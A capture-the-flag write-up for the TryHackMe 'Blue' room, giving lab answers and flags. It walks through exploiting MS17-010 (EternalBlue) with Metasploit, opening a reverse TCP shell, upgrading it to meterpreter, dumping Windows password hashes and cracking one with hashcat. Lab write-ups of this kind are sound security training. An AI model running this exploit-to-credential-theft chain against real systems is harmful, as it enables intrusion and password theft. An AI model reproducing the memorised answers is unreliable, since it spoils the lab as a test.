![Blue Banner](https://i.imgur.com/GosxHyQ.jpg)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Blue_Cover.png" alt="Blue Logo">
</p>

# Blue

This guide contains the answer and steps necessary to get to them for the [Blue](https://tryhackme.com/room/blue) room.

## Table of contents

- [Recon](#recon)
- [Gain Access](#gain-access)
- [Escalate](#escalate)
- [Cracking](#cracking)
- [Find flags!](#find-flags)

### Recon

In this part of the challenge we will find out more information about our target machine and find a way inside.

*Scan the machine.*

2. How many ports are open with a port number under 1000?

   To find the open ports we can use the following command (keep in mind we only need to scan the first 1000 ports):
   
   ```cmd
   nmap -sV -p-1000 10.10.91.75
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Recon_Nmap_Scan.png)

   ><details><summary>Click for answer</summary>3</details>

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

   We need some more information about the running services and `-sV` didn't give us enough. We can use the `-A` argument to run some additional scripts.
   
   Looking up the OS version for any exploits we can find something we can use.
   
   ![Vulnerability](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Recon_Vulnerability.png)

   ><details><summary>Click for answer</summary>MS17-010</details>

### Gain Access

In this part of the challenge we will use Metaspoit to exploit the vulnerability we found in the previous task.

*Start Metasploit*

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

   We can search for any modules we can use within Metasploit.
   
   ```cmd
   search ms17-010
   ```
   
   ![MSF Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Access_MSF_Module.png)

   ><details><summary>Click for answer</summary>exploit/windows/smb/ms17_010_eternalblue</details>

3. Show options and set the one required value. What is the name of this value? (All caps for submission)

   We now need to select this module and set any necessary options.
   
   ```cmd
   use exploit/windows/smb/ms17_010_eternalblue
   
   options
   
   set rhosts 10.10.91.75
   ```
   
   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Access_MSF_Options.png)

   ><details><summary>Click for answer</summary>rhosts</details>

*Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:*

```cmd
set payload windows/x64/shell/reverse_tcp
```

*With that done, run the exploit!*

We can do that by using `run` or `exploit`.

![MSF Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Access_MSF_Exploit.png)

*Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.*

I had to restart the machine, as it didn't work the first time. In the end, though, I got a shell. And unlike the next few steps, the shell already appears to run as `NT ATUHORITY` using `whoami`.

![MSF Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Access_MSF_Shell.png)

### Escalate

In this part of the challenge we will strengthen our position in the machine by escalating our priveleges.

1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

   Background the session can be done by typing `background`. 
   
   Doing an online search we find the module we are supposed to use to convert our shell.   

   ><details><summary>Click for answer</summary>post/multi/manage/shell_to_meterpreter</details>

2. Select this (use MODULE_PATH). Show options, what option are we required to change?

   We can select the module and set the required options using:
   
   ```cmd
   use post/multi/manage/shell_to_meterpreter
   
   options
   ```
   
   Finding the necessary session can be done with `sessions`. Now we can use `set session 1` to specifiy the correct session.
   
   ![Convert Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Escalate_Convert_Shell.png)

   ><details><summary>Click for answer</summary>session</details>

3. Set the required option, you may need to list all of the sessions to find your target here.

*Run! If this doesn't work, try completing the exploit from the previous task once more.*

*Once the meterpreter shell conversion completes, select that session for use.*

We can view our sessions again to see if we succeeded.

![MSF Sessions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Escalate_Meterpreter.png)

6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

   As mentioned before, we already established we are running as `NT AUTHORITY`.

7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

   Listing the processes on a Windows machine can be done with 'ps'.
   
   ![Processes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Escalate_Processes.png)

8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

   I was unable to migrate our process for some strange reason. However, looking at the PID we are currently running, it is listed as `NT AUTHORITY`.
   
   ![Migration](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Escalate_Migrate.png)

### Cracking

In this part of the challenge we will find any passwords on the system and crack the hashes using Hashcat.

1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

   Running the `hashdump` command in our Meterpreter session we get a list of the Windows passwords.
   
   ![Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Escalate_Passwords.png)

   ><details><summary>Click for answer</summary>jon</details>

2. Copy this password hash to a file and research how to crack it. What is the cracked password?

   We can use Hash-Identifier to look for the specific hash.
   
   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Cracking_Hash_Identifier.png)
   
   Looks like it is an MD5 hash. However, Hashcat coulnd't find anything. I tried multiple methods including a pass,salt combination (methods, 0, 10, and 20 in Hashcat). After some more research it looks like it is an NLTM hash and Hashcat has a specific code for that `1000`.
   
   ![Hashdump Method](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Cracking_Hashdump_Method.png)
   
   ![Hashcat Method](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Cracking_Hashcat_Method.png)
   
   Now we can run Hashcat with the following command (don't forget to add the hash to a file):
   
   ```cmd
   hashcat -m 1000 jon-password.hash /usr/share/wordlists/rockyou.txt
   ```
   
   ![Hashcat Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Cracking_Hashcat.png)
   
   Here we finally get a result.
   
   ![Hashcat Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Cracking_Hashcat_Password.png)

   ><details><summary>Click for answer</summary>alqfna22</details>

### Find flags!

In this last part of the challenge we will look for various flag around the system.

1. Flag1? This flag can be found at the system root. 

   System root would be `C:\`. We can navigate to it with:
   
   ```cmd
   cd C:\
   ```
   
   Using `type flag1.txt` we can get the contents of the file.
   
   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Flags_Flag_1.png)

   ><details><summary>Click for answer</summary>flag{access_the_machine}</details>

2. Flag2? This flag can be found at the location where passwords are stored within Windows.

   After some searching around I found the location where passwords are stored.
   
   ```cmd
   C:\Windows\System32\config
   ```
   
   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Flags_Flag_2.png)

   ><details><summary>Click for answer</summary>flag{sam_database_elevated_access}</details>

3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

   For this I started looking in through the user folders to find anything. Looks like there was something in the Documents folder.
   
   ![Flag 3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Flags_Flag_3.png)

   ><details><summary>Click for answer</summary>flag{admin_documents_can_be_valuable}</details>

Another method to find the flags (provided you know what to look for) is:

```cmd
dir "flag*" /s
```

![Flag Discovery](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/blue/Flags_Discovery.png)
